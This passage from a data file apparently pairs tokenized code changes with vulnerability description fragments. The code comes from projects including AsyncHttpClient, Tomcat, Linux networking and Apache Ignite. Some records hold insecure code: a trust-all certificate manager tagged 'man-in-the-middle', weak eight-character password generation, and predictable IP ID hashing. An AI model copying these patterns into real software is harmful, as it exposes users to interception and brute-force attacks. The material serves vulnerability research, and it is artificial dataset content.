"\"", ">]", "\"", ",", "(", "i", "&", "0x3", ")", "==", "1", "?", "KERN_CRIT", ":", "\"", "\",", "info", "-", ">", "ip", ")", ";", "#", "ifdef", "CONFIG_KALLSYMS", "print_symbol", "(", "\"%", "s", "\\", "n", "\"", ",", "info", "-", ">", "ip", ")", ";", "#", "else", "if", "(", "(", "i", "&", "0x03", ")", "=", "=", "0", ")", "printk", "(", "\"\\", "n", "\"", ");", "#", "endif", "printk", "(", "\"\\", "n", "\"", ");", "void", "parisc_show_stack", "(", "struct", "task_struct", "*", "task", ",", "unsigned", "long", "*", "sp", ","], "docstring_tokens": ["via", "vectors", "associated", "with", "an", "attempt", "to", "unwind", "a", "stack", "that", "contains", "userspace", "addresses", "."]}
{"contents": ["empty"], "code_tokens": ["protected", "boolean", "acceptAnyCertificate", ";", "TimeConverter", "timeConverter", ",", "/", "/", "boolean", "acceptAnyCertificate", ")", "{", "this", ".", "acceptAnyCertificate", "=", "acceptAnyCertificate", ";", "public", "boolean", "isAcceptAnyCertificate", "(", ")", "{", "return", "acceptAnyCertificate", ";", "}", "private", "boolean", "acceptAnyCertificate", "=", "defaultAcceptAnyCertificate", "(", ");", "public", "Builder", "setAcceptAnyCertificate", "(", "boolean", "acceptAnyCertificate", ")", "{", "this", ".", "acceptAnyCertificate", "=", "acceptAnyCertificate", ";", "return", "this", ";", "}", "timeConverter", ",", "/", "/", "acceptAnyCertificate", ")", ";", "acceptAnyCertificate", "=", "defaultAcceptAnyCertificate", "(", ");", "public", "AsyncHttpClientConfigBean", "setAcceptAnyCertificate", "(", "boolean", "acceptAnyCertificate", ")", "{", "this", ".", "acceptAnyCertificate", "=", "acceptAnyCertificate", ";", "return", "this", ";", "}", "public", "static", "boolean", "defaultAcceptAnyCertificate", "(", ")", "{", "return", "getBoolean", "(", "ASYNC_CLIENT", "+", "\"", "acceptAnyCertificate", "\"", ",", "false", ")", ";", "}", "public", "Builder", "setAcceptAnyCertificate", "(", "boolean", "acceptAnyCertificate", ")", "{", "configBuilder", ".", "setAcceptAnyCertificate", "(", "acceptAnyCertificate", ")", ";", "return", "this", ";", "}", "public", "static", "<", "T", ">", "T", "withDefault", "(", "T", "value", ",", "T", "defaults", ")", "{", "return", "value", "!", "=", "null", "?", "value", ":", "value", ";", "}", "import", "javax", ".", "net", ".", "ssl", ".", "TrustManager", ";", "import", "javax", ".", "net", ".", "ssl", ".", "X509TrustManager", ";", "import", "java", ".", "security", ".", "KeyManagementException", ";", "import", "java", ".", "security", ".", "NoSuchAlgorithmException", ";", "import", "java", ".", "security", ".", "SecureRandom", ";", "static", "class", "LooseTrustManager", "implements", "X509TrustManager", "{", "public", "java", ".", "security", ".", "cert", ".", "X509Certificate", "[", "]", "getAcceptedIssuers", "(", ")", "{", "return", "new", "java", ".", "security", ".", "cert", ".", "X509Certificate", "[", "0", "]", ";", "}", "public", "void", "checkClientTrusted", "(", "java", ".", "security", ".", "cert", ".", "X509Certificate", "[", "]", "certs", ",", "String", "authType", ")", "{", "}", "public", "void", "checkServerTrusted", "(", "java", ".", "security", ".", "cert", ".", "X509Certificate", "[", "]", "certs", ",", "String", "authType", ")", "{", "}", "}", "private", "SSLContext", "looseTrustManagerSSLContext", "=", "looseTrustManagerSSLContext", "(", ");", "private", "SSLContext", "looseTrustManagerSSLContext", "(", ")", "{", "try", "{", "SSLContext", "sslContext", "=", "SSLContext", ".", "getInstance", "(", "\"", "TLS", "\"", ");", "sslContext", ".", "init", "(", "null", ",", "new", "TrustManager", "[", "]", "{", "new", "LooseTrustManager", "(", ")", "}", ",", "new", "SecureRandom", "(", "))", ";", "return", "sslContext", ";", "}", "catch", "(", "NoSuchAlgorithmException", "e", ")", "{", "throw", "new", "ExceptionInInitializerError", "(", "e", ")", ";", "}", "catch", "(", "KeyManagementException", "e", ")", "{", "throw", "new", "ExceptionInInitializerError", "(", "e", ")", ";", "}", "}", "public", "SSLContext", "getSSLContext", "(", "boolean", "acceptAnyCertificate", ")", "throws", "GeneralSecurityException", ",", "IOException", "{", "return", "acceptAnyCertificate", "?", "looseTrustManagerSSLContext", ":", "SSLContext", ".", "getDefault", "(", ");", "AsyncHttpClientConfig", "cg", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ")/", "/", ".", "setMaxRedirects", "(", "5", ")", "//", ".", "setFollowRedirects", "(", "true", ")", "//", ".", "setAcceptAnyCertificate", "(", "true", ")", "//", ".", "build", "(", ");", "AsyncHttpClientConfig", "cg", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ")/", "/", ".", "setMaxRedirects", "(", "5", ")", "//", ".", "setFollowRedirects", "(", "true", ")", "//", ".", "setAcceptAnyCertificate", "(", "true", ")", "//", ".", "build", "(", ");", "AsyncHttpClientConfig", "cg", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ")/", "/", ".", "setMaxRedirects", "(", "5", ")", "//", ".", "setFollowRedirects", "(", "true", ")", "//", ".", "setAcceptAnyCertificate", "(", "true", ")", "//", ".", "build", "(", ");", "AsyncHttpClientConfig", "config", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ")/", "/", ".", "setFollowRedirects", "(", "true", ")", "//", ".", "setAcceptAnyCertificate", "(", "true", ")", "//", ".", "build", "(", ");", ".", "setAcceptAnyCertificate", "(", "true", ")", "//", ".", "setProxyProtocol", "(", "ProxyServer", ".", "Protocol", ".", "HTTPS", ")", "//", ".", "setProxyHost", "(", "\"", "127", ".", "0", ".", "0", ".", "1", "\"", ")/", "/", ".", "setProxyPort", "(", "port1", ")", "//", ".", "setFollowRedirects", "(", "true", ")", "//", ".", "setUrl", "(", "getTargetUrl2", "(", "))", "//", ".", "setAcceptAnyCertificate", "(", "true", ")", "//", "AsyncHttpClientConfig", "config", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ").", "setProxyServer", "(", "ps", ")", ".", "setAcceptAnyCertificate", "(", "true", ")", ".", "build", "(", ");", "context", "=", "SslUtils", ".", "getInstance", "(", ").", "getSSLContext", "(", "clientConfig", ".", "isAcceptAnyCertificate", "(", "))", ";", ".", "setAcceptAnyCertificate", "(", "true", ")", ".", "setAcceptAnyCertificate", "(", "true", ")", "if", "(", "sslContext", "=", "=", "null", ")", "sslContext", "=", "SslUtils", ".", "getInstance", "(", ").", "getSSLContext", "(", "config", ".", "isAcceptAnyCertificate", "(", "))", ";</s>TimeConverter", "timeConverter", ")", "{", "timeConverter", ")", ";", "public", "SSLContext", "getSSLContext", "(", ")", "throws", "GeneralSecurityException", ",", "IOException", "{", "return", "SSLContext", ".", "getDefault", "(", ");", "AsyncHttpClientConfig", "cg", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ").", "setMaxRedirects", "(", "5", ")", ".", "setFollowRedirects", "(", "true", ")", ".", "build", "(", ");", "AsyncHttpClientConfig", "cg", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ").", "setMaxRedirects", "(", "5", ")", ".", "setFollowRedirects", "(", "true", ")", ".", "build", "(", ");", "AsyncHttpClientConfig", "cg", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ").", "setMaxRedirects", "(", "5", ")", ".", "setFollowRedirects", "(", "true", ")", ".", "build", "(", ");", "AsyncHttpClientConfig", ".", "Builder", "b", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ");", "b", ".", "setFollowRedirects", "(", "true", ")", ";", "AsyncHttpClientConfig", "config", "=", "b", ".", "build", "(", ");", ".", "setProxyProtocol", "(", "ProxyServer", ".", "Protocol", ".", "HTTPS", ")", ".", "setProxyHost", "(", "\"", "127", ".", "0", ".", "0", ".", "1", "\"", ").", "setProxyPort", "(", "port1", ")", ".", "setFollowRedirects", "(", "true", ")", ".", "setUrl", "(", "getTargetUrl2", "(", "))", "//", "AsyncHttpClientConfig", "config", "=", "new", "AsyncHttpClientConfig", ".", "Builder", "(", ").", "setProxyServer", "(", "ps", ")", ".", "build", "(", ");", "context", "=", "SslUtils", ".", "getInstance", "(", ").", "getSSLContext", "(", ");", "if", "(", "sslContext", "=", "=", "null", ")", "{", "sslContext", "=", "SslUtils", ".", "getInstance", "(", ").", "getSSLContext", "(", ");", "}"], "docstring_tokens": ["using", "man-in-the-middle", "techniques"]}
{"contents": ["empty"], "code_tokens": ["-", "Fixed", "bug", "#", "52879", "(", "Objects", "unreferenced", "in", "__get", ",", "__set", ",", "__isset", "or", "__unset", "can", "be", "freed", "too", "early", ")", ".", "(", "mail_ben_schmidt", "at", "yahoo", "dot", "com", "dot", "au", ",", "Dmitry", ")", "-", "-", "TEST", "-", "-", "Bug", "#", "52879", "(", "Objects", "unreferenced", "in", "__get", ",", "__set", ",", "__isset", "or", "__unset", "can", "be", "freed", "too", "early", ")", "-", "-", "FILE", "-", "-", "<", "?", "php", "class", "MyClass", "{", "public", "$", "myRef", ";", "public", "function", "__set", "(", "$", "property", ",", "$", "value", ")", "{", "$", "this", "-", ">", "myRef", "=", "$", "value", ";", "}", "}", "$", "myGlobal", "=", "new", "MyClass", "(", "$", "myGlobal", ")", ";", "$", "myGlobal", "-", ">", "myRef", "=", "&$", "myGlobal", ";", "$", "myGlobal", "-", ">", "myNonExistentProperty", "=", "\"", "ok", "\\", "n", "\"", ";", "echo", "$", "myGlobal", ";", "-", "-", "EXPECT", "-", "-", "ok", "@", "@", "-", "329", ",", "6", "+", "329", ",", "9", "@", "@", "zval", "*", "zend_std_read_property", "(", "zval", "*", "object", ",", "zval", "*", "member", ",", "int", "type", "TSRMLS_DC", ")", "if", "(", "PZVAL_IS_REF", "(", "object", ")", ")", "{", "SEPARATE_ZVAL", "(", "&", "object", ")", ";", "}", "if", "(", "PZVAL_IS_REF", "(", "object", ")", ")", "{", "SEPARATE_ZVAL", "(", "&", "object", ")", ";", "}", "}", "else", "if", "(", "property_info", ")", "{", "if", "(", "PZVAL_IS_REF", "(", "object", ")", ")", "{", "SEPARATE_ZVAL", "(", "&", "object", ")", ";", "}", "if", "(", "PZVAL_IS_REF", "(", "object", ")", ")", "{", "SEPARATE_ZVAL", "(", "&", "object", ")", ";", "}</s>-", "Fixed", "bug", "#", "52929", "(", "Segfault", "in", "filter_var", "with", "FILTER_VALIDATE_EMAIL", "with", "-", "Fixed", "bug", "#", "52772", "(", "var_dump", "(", ")", "doesn", "'", "t", "check", "for", "the", "existence", "of", "-", "Fixed", "bug", "#", "52546", "(", "pdo_dblib", "segmentation", "fault", "when", "iterating", "MONEY", "values", ")", ".", "@", "@", "-", "0", ",", "0", "+", "1", ",", "16", "@", "@", "int", "setter_done", "=", "0", ";", "setter_done", "=", "1", ";", "}", "if", "(", "!", "setter_done", "&", "&", "property_info", ")", "{"], "docstring_tokens": ["by", "a", "reference", "."]}
{"contents": ["empty"], "code_tokens": ["File", "file", "=", "file", "(", "name", ",", "true", ")", ";", "File", "file", "=", "file", "(", "name", ",", "true", ")", ";", "File", "file", "=", "file", "(", "oldName", ",", "true", ")", ";", "File", "newFile", "=", "file", "(", "newName", ",", "false", ")", ";", "if", "(", "newFile", "=", "=", "null", ")", "{", "File", "file", "=", "file", "(", "name", ",", "true", ")", ";", "File", "file", "=", "file", "(", "name", ",", "true", ")", ";", "File", "file", "=", "file", "(", "name", ",", "false", ")", ";", "File", "file", "=", "file", "(", "name", ",", "false", ")", ";", "File", "file", "=", "file", "(", "name", ",", "false", ")", ";", "return", "file", "(", "name", ",", "true", ")", ";", "}", "/", "**", "*", "Return", "a", "File", "object", "representing", "the", "specified", "normalized", "*", "context", "-", "relative", "path", "if", "it", "exists", "and", "is", "readable", ".", "Otherwise", ",", "*", "return", "<", "code", ">", "null", "<", "/", "code", ">", ".", "*", "*", "@", "param", "name", "Normalized", "context", "-", "relative", "path", "(", "with", "leading", "'", "/'", ")", "*", "@", "param", "mustExist", "Must", "the", "specified", "resource", "exist", "?", "*", "/", "protected", "File", "file", "(", "String", "name", ",", "boolean", "mustExist", ")", "{", "return", "validate", "(", "file", ",", "mustExist", ",", "absoluteBase", ")", ";", "}", "protected", "File", "validate", "(", "File", "file", ",", "boolean", "mustExist", ",", "String", "absoluteBase", ")", "{", "if", "(", "!", "mustExist", "|", "|", "file", ".", "exists", "(", ")", "&", "&", "file", ".", "canRead", "(", "))", "{", "*", "@", "param", "path", "The", "set", "of", "file", "system", "paths", "and", "virtual", "paths", "to", "map", "them", "to", "*", "in", "the", "required", "format", "File", "dir", "=", "new", "File", "(", "resSpec", ".", "substring", "(", "idx", "+", "1", ")", ");", "resourcePaths", ".", "add", "(", "dir", ".", "getAbsolutePath", "(", "))", ";", "f", "=", "validate", "(", "f", ",", "true", ",", "resourcesDir", ")", ";", "if", "(", "f", "!", "=", "null", ")", "{", "f", "=", "validate", "(", "f", ",", "true", ",", "resourcesDir", ")", ";", "if", "(", "f", "!", "=", "null", ")", "{", "return", "file", "(", "name", ",", "true", ")", ";", "}", "@", "Override", "protected", "File", "file", "(", "String", "name", ",", "boolean", "mustExist", ")", "{", "File", "file", "=", "super", ".", "file", "(", "name", ",", "true", ")", ";", "file", "=", "validate", "(", "file", ",", "true", ",", "resourcesDir", ")", ";", "if", "(", "file", "!", "=", "null", ")", "{", "file", "=", "validate", "(", "file", ",", "true", ",", "resourcesDir", ")", ";", "if", "(", "file", "!", "=", "null", ")", "{", "f", "=", "validate", "(", "f", ",", "true", ",", "resourcesDir", ")", ";", "if", "(", "f", "!", "=", "null", "&", "&", "f", ".", "isDirectory", "(", "))", "{", "f", "=", "validate", "(", "f", ",", "true", ",", "resourcesDir", ")", ";", "if", "(", "f", "!", "=", "null", ")", "{", "f", "=", "validate", "(", "f", ",", "true", ",", "resourcesDir", ")", ";", "if", "(", "f", "!", "=", "null", ")", "{", "<", "subsection", "name", "=", "\"", "Catalina", "\"", ">", "<", "changelog", ">", "<", "fix", ">", "Correct", "regression", "in", "7", ".", "0", ".", "80", "that", "broke", "WebDAV", ".", "(", "markt", ")", "<", "/", "fix", ">", "<", "/", "changelog", ">", "<", "/", "subsection", "></s>File", "file", "=", "file", "(", "name", ")", ";", "File", "file", "=", "file", "(", "name", ")", ";", "File", "file", "=", "file", "(", "oldName", ")", ";", "File", "newFile", "=", "file", "(", "newName", ")", ";", "if", "(", "newName", "=", "=", "null", ")", "{", "File", "file", "=", "file", "(", "name", ")", ";", "File", "file", "=", "file", "(", "name", ")", ";", "File", "file", "=", "file", "(", "name", ")", ";", "File", "file", "=", "file", "(", "name", ")", ";", "File", "file", "=", "file", "(", "name", ")", ";", "if", "(", "file", ".", "exists", "(", ")", "&", "&", "file", ".", "canRead", "(", "))", "{", "*", "@", "param", "path", "String", "dir", "=", "resSpec", ".", "substring", "(", "idx", "+", "1", ")", ";", "resourcePaths", ".", "add", "(", "dir", ")", ";", "if", "(", "f", ".", "exists", "(", ")", "&", "&", "f", ".", "canRead", "(", "))", "{", "if", "(", "f", ".", "exists", "(", ")", "&", "&", "f", ".", "canRead", "(", "))", "{", "File", "file", "=", "super", ".", "file", "(", "name", ")", ";", "if", "(", "file", ".", "exists", "(", ")", "&", "&", "file", ".", "canRead", "(", "))", "{", "if", "(", "file", ".", "exists", "(", ")", "&", "&", "file", ".", "canRead", "(", "))", "{", "if", "(", "f", ".", "exists", "(", ")", "&", "&", "f", ".", "canRead", "(", ")", "&", "&", "f", ".", "isDirectory", "(", "))", "{", "if", "(", "f", ".", "exists", "(", ")", "&", "&", "f", ".", "canRead", "(", "))", "{", "if", "(", "f", ".", "exists", "(", ")", "&", "&", "f", ".", "canRead", "(", "))", "{", "-", "->"], "docstring_tokens": ["sending", "a", "specially", "crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "security", ".", "SecureRandom", ";", "private", "static", "final", "String", "SYMBOLS", "=", "\"", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", "\"", ";", "private", "final", "SecureRandom", "random", "=", "new", "SecureRandom", "(", ");", "private", "static", "final", "int", "PASSWORD_LENGTH", "=", "32", ";", "StringBuilder", "sb", "=", "new", "StringBuilder", "(", "PASSWORD_LENGTH", ")", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "PASSWORD_LENGTH", ";", "i", "+", "+)", "{", "int", "index", "=", "random", ".", "nextInt", "(", "SYMBOLS", ".", "length", "(", "))", ";", "sb", ".", "append", "(", "SYMBOLS", ".", "charAt", "(", "index", ")", ");", "}", "String", "password", "=", "sb", ".", "toString", "(", ");</s>import", "org", ".", "apache", ".", "commons", ".", "lang", ".", "RandomStringUtils", ";", "String", "password", "=", "RandomStringUtils", ".", "randomAlphanumeric", "(", "8", ")", ";"], "docstring_tokens": ["using", "a", "brute", "force", "technique"]}
{"contents": ["empty"], "code_tokens": ["static", "inline", "bool", "siphash_key_is_zero", "(", "const", "siphash_key_t", "*", "key", ")", "{", "return", "!", "(", "key", "-", ">", "key", "[", "0", "]", "|", "key", "-", ">", "key", "[", "1", "]", ");", "}", "#", "include", "<", "linux", "/", "siphash", ".", "h", ">", "siphash_key_t", "ip_id_key", ";", "/", "*", "Note", "the", "following", "code", "is", "not", "safe", ",", "but", "this", "is", "okay", ".", "*", "/", "if", "(", "unlikely", "(", "siphash_key_is_zero", "(", "&", "net", "-", ">", "ipv4", ".", "ip_id_key", ")", "))", "get_random_bytes", "(", "&", "net", "-", ">", "ipv4", ".", "ip_id_key", ",", "sizeof", "(", "net", "-", ">", "ipv4", ".", "ip_id_key", ")", ");", "hash", "=", "siphash_3u32", "(", "(", "__force", "u32", ")", "iph", "-", ">", "daddr", ",", "iph", "-", ">", "protocol", ",", "&", "net", "-", ">", "ipv4", ".", "ip_id_key", ")", ";", "static", "u32", "__ipv6_select_ident", "(", "struct", "net", "*", "net", ",", "const", "struct", "{", "struct", "in6_addr", "dst", ";", "struct", "in6_addr", "src", ";", "}", "__aligned", "(", "SIPHASH_ALIGNMENT", ")", "combined", "=", "{", ".", "dst", "=", "*", "dst", ",", ".", "src", "=", "*", "src", ",", "}", ";", "/", "*", "Note", "the", "following", "code", "is", "not", "safe", ",", "but", "this", "is", "okay", ".", "*", "/", "if", "(", "unlikely", "(", "siphash_key_is_zero", "(", "&", "net", "-", ">", "ipv4", ".", "ip_id_key", ")", "))", "get_random_bytes", "(", "&", "net", "-", ">", "ipv4", ".", "ip_id_key", ",", "sizeof", "(", "net", "-", ">", "ipv4", ".", "ip_id_key", ")", ");", "hash", "=", "siphash", "(", "&", "combined", ",", "sizeof", "(", "combined", ")", ",", "&", "net", "-", ">", "ipv4", ".", "ip_id_key", ")", ";", "id", "=", "__ipv6_select_ident", "(", "net", ",", "&", "addrs", "[", "1", "]", ",", "&", "addrs", "[", "0", "]", ");", "id", "=", "__ipv6_select_ident", "(", "net", ",", "daddr", ",", "saddr", ")", ";</s>static", "u32", "ip_idents_hashrnd", "__read_mostly", ";", "net_get_random_once", "(", "&", "ip_idents_hashrnd", ",", "sizeof", "(", "ip_idents_hashrnd", ")", ");", "hash", "=", "jhash_3words", "(", "(", "__force", "u32", ")", "iph", "-", ">", "daddr", ",", "iph", "-", ">", "protocol", "^", "net_hash_mix", "(", "net", ")", ",", "ip_idents_hashrnd", ")", ";", "static", "u32", "__ipv6_select_ident", "(", "struct", "net", "*", "net", ",", "u32", "hashrnd", ",", "hash", "=", "__ipv6_addr_jhash", "(", "dst", ",", "hashrnd", ")", ";", "hash", "=", "__ipv6_addr_jhash", "(", "src", ",", "hash", ")", ";", "hash", "^", "=", "net_hash_mix", "(", "net", ")", ";", "static", "u32", "ip6_proxy_idents_hashrnd", "__read_mostly", ";", "net_get_random_once", "(", "&", "ip6_proxy_idents_hashrnd", ",", "sizeof", "(", "ip6_proxy_idents_hashrnd", ")", ");", "id", "=", "__ipv6_select_ident", "(", "net", ",", "ip6_proxy_idents_hashrnd", ",", "&", "addrs", "[", "1", "]", ",", "&", "addrs", "[", "0", "]", ");", "static", "u32", "ip6_idents_hashrnd", "__read_mostly", ";", "net_get_random_once", "(", "&", "ip6_idents_hashrnd", ",", "sizeof", "(", "ip6_idents_hashrnd", ")", ");", "id", "=", "__ipv6_select_ident", "(", "net", ",", "ip6_idents_hashrnd", ",", "daddr", ",", "saddr", ")", ";"], "docstring_tokens": ["via", "enumeration)."]}
{"contents": ["empty"], "code_tokens": ["while", "(", "bytes", "|", "|", "unlikely", "(", "i", "-", ">", "count", "&", "&", "!", "iov", "-", ">", "iov_len", ")", ")", "{</s>while", "(", "bytes", "|", "|", "unlikely", "(", "!", "iov", "-", ">", "iov_len", "&", "&", "i", "-", ">", "count", ")", ")", "{"], "docstring_tokens": ["sending", "file", "I/O", "operations", "with", "readv", "and", "writev", "in", "a", "specific", "sequence"]}
{"contents": ["empty"], "code_tokens": ["/", "**", "Defines", "path", "to", "the", "file", "that", "contains", "list", "of", "classes", "allowed", "to", "safe", "deserialization", ".", "*/", "public", "static", "final", "String", "IGNITE_MARSHALLER_WHITELIST", "=", "\"", "IGNITE_MARSHALLER_WHITELIST", "\"", ";", "/", "**", "Defines", "path", "to", "the", "file", "that", "contains", "list", "of", "classes", "disallowed", "to", "safe", "deserialization", ".", "*/", "public", "static", "final", "String", "IGNITE_MARSHALLER_BLACKLIST", "=", "\"", "IGNITE_MARSHALLER_BLACKLIST", "\"", ";", "/", "**", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "ignite", ".", "internal", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "IllegalFormatException", ";", "import", "java", ".", "util", ".", "Map", ";", "/", "**", "*", "Set", "of", "classes", "represented", "as", "prefix", "tree", ".", "*", "{", "@", "code", "*", "}", "symbol", "is", "allowed", "and", "indicates", "that", "all", "packages", "and", "classes", "are", "included", ".", "*", "/", "public", "class", "ClassSet", "{", "/", "**", "Corresponds", "to", "{", "@", "code", "*", "}", "symbol", ".", "*", "/", "private", "static", "final", "Map", "<", "String", ",", "Node", ">", "ALL", "=", "Collections", ".", "emptyMap", "(", ");", "/", "**", "Root", ".", "*", "/", "private", "Node", "root", "=", "new", "Node", "(", ");", "/", "**", "*", "Adds", "class", "name", "to", "the", "set", ".", "*", "*", "@", "param", "clsName", "Class", "name", ".", "*", "/", "public", "void", "add", "(", "String", "clsName", ")", "{", "String", "[", "]", "tokens", "=", "clsName", ".", "split", "(", "\"\\", "\\.", "\")", ";", "Node", "cur", "=", "root", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "tokens", ".", "length", ";", "i", "+", "+)", "{", "if", "(", "cur", ".", "children", "=", "=", "ALL", ")", "return", ";", "if", "(", "tokens", "[", "i", "]", ".", "equals", "(", "\"*", "\")", ")", "{", "if", "(", "i", "!", "=", "tokens", ".", "length", "-", "1", ")", "throw", "new", "IllegalArgumentException", "(", "\"", "Incorrect", "class", "name", "format", ".", "\")", ";", "cur", ".", "children", "=", "ALL", ";", "return", ";", "}", "if", "(", "cur", ".", "children", "=", "=", "null", ")", "cur", ".", "children", "=", "new", "HashMap", "<", ">(", ");", "Node", "n", "=", "cur", ".", "children", ".", "get", "(", "tokens", "[", "i", "]", ");", "if", "(", "n", "=", "=", "null", ")", "{", "n", "=", "new", "Node", "(", ");", "cur", ".", "children", ".", "put", "(", "tokens", "[", "i", "]", ",", "n", ")", ";", "}", "cur", "=", "n", ";", "}", "}", "/", "**", "*", "@", "param", "clsName", "Class", "name", ".", "*", "/", "public", "boolean", "contains", "(", "String", "clsName", ")", "{", "String", "[", "]", "tokens", "=", "clsName", ".", "split", "(", "\"\\", "\\.", "\")", ";", "Node", "cur", "=", "root", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "tokens", ".", "length", ";", "i", "+", "+)", "{", "if", "(", "cur", ".", "children", "=", "=", "ALL", ")", "return", "true", ";", "if", "(", "cur", ".", "children", "=", "=", "null", ")", "return", "false", ";", "Node", "n", "=", "cur", ".", "children", ".", "get", "(", "tokens", "[", "i", "]", ");", "if", "(", "n", "=", "=", "null", ")", "return", "false", ";", "if", "(", "i", "=", "=", "tokens", ".", "length", "-", "1", ")", "return", "true", ";", "cur", "=", "n", ";", "}", "return", "false", ";", "}", "/", "**", "*", "/", "private", "static", "class", "Node", "{", "/", "**", "Children", ".", "*", "/", "private", "Map", "<", "String", ",", "Node", ">", "children", ";", "}", "}", "@", "@", "-", "91", ",", "6", "+", "91", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgnitePredicate", ";", "List", "<", "PluginProvider", ">", "plugins", ",", "IgnitePredicate", "<", "String", ">", "clsFilter", "marshCtx", "=", "new", "MarshallerContextImpl", "(", "plugins", ",", "clsFilter", ")", ";", "import", "java", ".", "io", ".", "BufferedReader", ";", "import", "java", ".", "io", ".", "FileInputStream", ";", "import", "java", ".", "io", ".", "FileNotFoundException", ";", "import", "java", ".", "io", ".", "InputStreamReader", ";", "import", "static", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "MarshallerUtils", ".", "CLS_NAMES_FILE", ";", "import", "static", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "MarshallerUtils", ".", "JDK_CLS_NAMES_FILE", ";", "plugins", ",", "classNameFilter", "(", ")", "/", "**", "*", "Returns", "class", "name", "filter", "for", "marshaller", ".", "*", "@", "return", "Class", "name", "filter", "for", "marshaller", ".", "*", "/", "private", "IgnitePredicate", "<", "String", ">", "classNameFilter", "(", ")", "throws", "IgniteCheckedException", "{", "ClassSet", "whiteList", "=", "classWhiteList", "(", ");", "ClassSet", "blackList", "=", "classBlackList", "(", ");", "return", "new", "IgnitePredicate", "<", "String", ">", "()", "{", "@", "Override", "public", "boolean", "apply", "(", "String", "s", ")", "{", "/", "/", "Allows", "all", "primitive", "arrays", "and", "checks", "arrays", "'", "type", ".", "if", "(", "(", "blackList", "!", "=", "null", "|", "|", "whiteList", "!", "=", "null", ")", "&", "&", "s", ".", "charAt", "(", "0", ")", "=", "=", "'", "['", ")", "{", "if", "(", "s", ".", "charAt", "(", "1", ")", "=", "=", "'", "L", "'", "&", "&", "s", ".", "length", "(", ")", ">", "2", ")", "s", "=", "s", ".", "substring", "(", "2", ",", "s", ".", "length", "(", ")", "-", "1", ")", ";", "else", "return", "true", ";", "}", "return", "(", "blackList", "=", "=", "null", "|", "|", "!", "blackList", ".", "contains", "(", "s", ")", ")", "&", "&", "(", "whiteList", "=", "=", "null", "|", "|", "whiteList", ".", "contains", "(", "s", ")", ");", "}", "}", ";", "}", "/", "**", "*", "@", "return", "White", "list", "of", "classes", ".", "*", "/", "private", "ClassSet", "classWhiteList", "(", ")", "throws", "IgniteCheckedException", "{", "ClassSet", "clsSet", "=", "null", ";", "String", "fileName", "=", "IgniteSystemProperties", ".", "getString", "(", "IgniteSystemProperties", ".", "IGNITE_MARSHALLER_WHITELIST", ")", ";", "if", "(", "fileName", "!", "=", "null", ")", "{", "clsSet", "=", "new", "ClassSet", "(", ");", "addClassNames", "(", "JDK_CLS_NAMES_FILE", ",", "clsSet", ")", ";", "addClassNames", "(", "CLS_NAMES_FILE", ",", "clsSet", ")", ";", "addClassNames", "(", "fileName", ",", "clsSet", ")", ";", "}", "return", "clsSet", ";", "}", "/", "**", "*", "@", "return", "Black", "list", "of", "classes", ".", "*", "/", "private", "ClassSet", "classBlackList", "(", ")", "throws", "IgniteCheckedException", "{", "ClassSet", "clsSet", "=", "null", ";", "String", "blackListFileName", "=", "IgniteSystemProperties", ".", "getString", "(", "IgniteSystemProperties", ".", "IGNITE_MARSHALLER_BLACKLIST", ")", ";", "if", "(", "blackListFileName", "!", "=", "null", ")", "addClassNames", "(", "blackListFileName", ",", "clsSet", "=", "new", "ClassSet", "(", "))", ";", "return", "clsSet", ";", "}", "/", "**", "*", "Reads", "class", "names", "from", "resource", "referred", "by", "given", "system", "property", "name", "and", "returns", "set", "of", "classes", ".", "*", "@", "param", "fileName", "File", "name", "containing", "list", "of", "classes", ".", "*", "@", "param", "clsSet", "Class", "set", "for", "update", ".", "*", "@", "return", "Set", "of", "classes", ".", "*", "/", "private", "void", "addClassNames", "(", "String", "fileName", ",", "ClassSet", "clsSet", ")", "throws", "IgniteCheckedException", "{", "InputStream", "is", "=", "this", ".", "getClass", "(", ").", "getClassLoader", "(", ").", "getResourceAsStream", "(", "fileName", ")", ";", "if", "(", "is", "=", "=", "null", ")", "{", "try", "{", "is", "=", "new", "FileInputStream", "(", "new", "File", "(", "fileName", ")", ");", "}", "catch", "(", "FileNotFoundException", "e", ")", "{", "throw", "new", "IgniteCheckedException", "(", "\"", "File", "\"", "+", "fileName", "+", "\"", "not", "found", ".", "\")", 